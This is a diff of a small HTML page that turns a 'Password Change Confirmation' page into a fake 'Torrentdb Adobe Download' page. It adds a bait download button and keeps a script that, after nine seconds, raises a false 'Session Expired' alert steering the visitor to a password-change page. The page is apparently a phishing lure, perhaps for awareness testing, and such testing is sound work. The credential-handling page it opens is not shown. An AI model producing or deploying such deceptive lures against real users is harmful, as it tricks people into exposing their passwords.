@@ -2,20 +2,44 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Password Change Confirmation</title>
+    <title>Torrentdb Adobe Download</title>
 </head>
+
+<style>
+	.buttonnext {
+		margin-left: 2cm;
+		background-color: rgb(206, 172, 92);
+		color: rgb(0, 0, 0);
+		border: 1px solid black;
+		border-radius: 5px;
+		padding: 8px 16px;
+		font-size: 23px;
+		transition-duration: 0.4s;
+		cursor: pointer;
+		font-family: "Century Gothic", sans-serif;
+	  }
+	  
+	  .buttonnext:hover {
+		background-color: white;
+		color: black;
+		border: 1px solid black;
+		box-shadow: 0 12px 16px 0 rgba(0, 0, 0, 0.24), 0 17px 50px 0 rgba(0, 0, 0, 0.19);
+	  }
+</style>
+
 <body>
-    <iframe src="../images/session_background.png" width="1400" height="600"></iframe>
+    <img src="../images/torrent_adobe.png" width="1420" height="660">
+	<button class="buttonnext"> Download latest version </button>
     <script>
         window.onload = function() {
             setTimeout(function() {
-                if (confirm("Session Expired. Do you want to change the password?")) {
+                if (confirm("Session Expired. Click Ok to change your password.")) {
                     window.open("session2.html", "_blank");
                     window.close();
                 } else {
                     window.close();
                 }
-            }, 4000);
+            }, 9000);
         }
     </script>
 </body>
